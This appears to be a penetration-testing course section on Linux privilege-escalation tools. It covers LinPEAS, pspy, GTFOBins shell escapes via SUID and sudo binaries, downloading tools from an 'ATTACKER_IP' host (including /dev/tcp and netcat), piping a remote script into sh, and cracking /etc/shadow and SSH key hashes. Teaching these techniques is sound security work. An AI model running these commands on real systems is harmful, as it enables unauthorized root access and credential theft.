# 04 — Privilege Escalation: Tools

> Essential tools for finding and exploiting privilege escalation vectors.

> 📋 **What You Will Do In This Section**
> - [ ] Run LinPEAS and interpret its color-coded output
> - [ ] Monitor hidden processes with pspy
> - [ ] Use GTFOBins to exploit SUID and sudo binaries
> - [ ] Transfer files to targets using 5+ methods
> - [ ] Crack password hashes with hashcat and john

---

## 🔴 LinPEAS (Linux Privilege Escalation Awesome Script)

> 💡 **Why This Matters**
> LinPEAS automates 95% of the manual enumeration checklist. It checks SUID, sudo, cron, capabilities, writable files, credentials, Docker, kernel version, and 100+ other vectors — in under 2 minutes. Run this on EVERY Linux target after getting a shell.

```bash
# Download
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Transfer to target
python3 -m http.server 8000  # On attacker
wget http://ATTACKER_IP:8000/linpeas.sh  # On target

# Execute
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Focused scans
./linpeas.sh -a          # All checks
./linpeas.sh -s          # Stealth mode (no network)
./linpeas.sh -P          # Only password checking
```

### Color Coding (Critical to Understand)

```
RED/YELLOW → 95% chance of privesc vector — INVESTIGATE IMMEDIATELY
RED        → Must investigate — exploit likely available
CYAN       → Active shell user info
GREEN      → Environmental safeguards (good for target)
BLUE       → Readable interesting files
```

#### 🧪 Try It Now — Run LinPEAS

```bash
# Download and run on your local system (for practice)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | head -100
```

> ✅ **Expected Output**
> A color-coded summary of your system's privilege escalation surface. Key sections to look for:
> - "Sudo version" → Check for Baron Samedit
> - "SUID" → Non-standard SUID binaries
> - "Cron jobs" → Writable scripts
> - "Interesting Files" → Passwords in configs

> 🔧 **If Stuck**
> - Output too long → Pipe to file: `./linpeas.sh | tee /tmp/linpeas.txt`, then search: `grep -E "RED|YELLOW" /tmp/linpeas.txt`
> - No network on target → Download LinPEAS first, then base64-encode and paste

---

## 🔴 pspy (Process Spy)

> 💡 **Why This Matters**
> Not all cron jobs appear in `/etc/crontab`. Some are configured per-user, some run via systemd timers, and some are triggered by inotify. pspy monitors ALL new processes in real-time — revealing hidden scheduled tasks that LinPEAS can't find.

```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Execute
chmod +x pspy64
./pspy64

# Watch for:
# UID=0    → Process running as root
# CMD: /bin/sh /opt/backup.sh  → Root cron script
# CMD: python3 /root/cleanup.py → Root automation

# Use -p for process changes, -f for file system events
./pspy64 -pf

# Faster scan interval
./pspy64 -i 100  # Check every 100ms
```

> ✅ **Expected Output**
> ```
> CMD: UID=0  PID=1234  | /usr/sbin/cron -f
> CMD: UID=0  PID=1235  | /bin/sh -c /opt/backup.sh
> CMD: UID=0  PID=1236  | tar czf /tmp/backup.tar.gz /home/
> ```
> You just discovered a root cron job running `/opt/backup.sh`!

---

## 🔴 GTFOBins Reference

> 💡 **Why This Matters**
> GTFOBins (https://gtfobins.github.io/) documents how to exploit 300+ Linux binaries for privilege escalation. When you find a SUID binary or sudo permission, look it up on GTFOBins — the exploit is already written for you.

### SUID Exploitation

```bash
bash -p
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
perl -e 'exec "/bin/sh";'
env /bin/sh -p
awk 'BEGIN {system("/bin/sh")}'
less /etc/passwd    → !sh
```

### Sudo Exploitation

```bash
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/shadow  → !sh
sudo man man  → !sh
sudo env /bin/sh
sudo git -p help config  → !sh
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh"
sudo zip /tmp/t.zip /tmp/t -T --unzip-command="sh -c /bin/sh"
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
sudo ruby -e 'exec "/bin/sh"'
```

#### 🧪 Try It Now — GTFOBins Workflow

```bash
# Simulate finding a sudo entry
echo "=== Simulated sudo -l output ==="
echo "User user may run: (ALL) NOPASSWD: /usr/bin/vim"
echo ""
echo "→ Step 1: Check GTFOBins for 'vim'"
echo "→ Step 2: Found: sudo vim -c ':!/bin/sh'"
echo "→ Step 3: Execute and get root"
echo ""
echo "Practice: Try these commands that DON'T require SUID/sudo:"
echo "  vim -c ':!whoami'"
echo "  python3 -c 'import os; os.system(\"whoami\")'"
echo "  awk 'BEGIN {system(\"whoami\")}'"
```

---

## 🔴 Kernel Exploit Tools

```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Compile kernel exploits
# On attacker (matching architecture):
gcc -o exploit exploit.c
# Transfer compiled binary to target
```

#### 🧪 Try It Now — Check Your Kernel

```bash
echo "=== Kernel Info ==="
uname -a
echo ""
echo "=== Known Vulnerable Ranges ==="
KVER=$(uname -r)
echo "Kernel: $KVER"
echo "DirtyPipe: Vulnerable if 5.8 <= kernel < 5.16.11"
echo "PwnKit: Check pkexec version (most systems before 2022 patches)"
echo "Baron Samedit: Check sudo version < 1.9.5p2"
```

---

## 🔴 File Transfer Methods

> 💡 **Why This Matters**
> Targets often don't have `wget` or `curl`. You need multiple transfer methods — Python HTTP server, netcat, base64 encoding, or even pasting through the shell. Knowing 5+ methods ensures you can always get tools onto the target.

```bash
# === ATTACKER TO TARGET ===

# Python HTTP server (most common)
python3 -m http.server 8000           # Attacker
wget http://ATTACKER:8000/linpeas.sh  # Target
curl http://ATTACKER:8000/linpeas.sh -o linpeas.sh  # Alternative

# Netcat
nc -lvp 4444 < linpeas.sh    # Attacker
nc ATTACKER 4444 > linpeas.sh # Target

# SCP (if SSH available)
scp linpeas.sh user@TARGET:/tmp/

# Base64 (when no network tools available)
base64 linpeas.sh | tr -d '\n'    # On attacker → copy output
echo 'BASE64_OUTPUT' | base64 -d > linpeas.sh  # On target

# /dev/tcp (bash built-in, works when nothing else does)
bash -c 'cat < /dev/tcp/ATTACKER/8000 > linpeas.sh'
```

---

## 🔴 Password Cracking

```bash
# Crack /etc/shadow hashes
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt  # SHA-512
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt   # MD5

# john the ripper
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack SSH key passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 📋 Tool Usage Priority

| Priority | Tool/Command | Time | What It Finds |
|----------|-------------|------|---------------|
| 1 | `sudo -l` | 5 sec | Sudo misconfigs — fastest path |
| 2 | `find / -perm -4000` | 10 sec | SUID binaries |
| 3 | LinPEAS | 2 min | Everything (comprehensive) |
| 4 | pspy | 5 min | Hidden cron jobs, root processes |
| 5 | Kernel exploit suggester | 1 min | Kernel CVEs (last resort) |

---

## 🧠 If You're Stuck

1. **LinPEAS too noisy** → Focus on RED/YELLOW lines only. Pipe to file and grep.
2. **Can't transfer files** → Use base64 encoding or `/dev/tcp` bash built-in.
3. **pspy shows nothing** → Let it run for at least 5 minutes. Some cron jobs run hourly.
4. **GTFOBins exploit doesn't work** → Check if the binary actually has SUID set (`ls -la`) and you're using the correct syntax.
5. **hashcat not cracking** → Try a bigger wordlist, or use rules: `hashcat -m 1800 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`
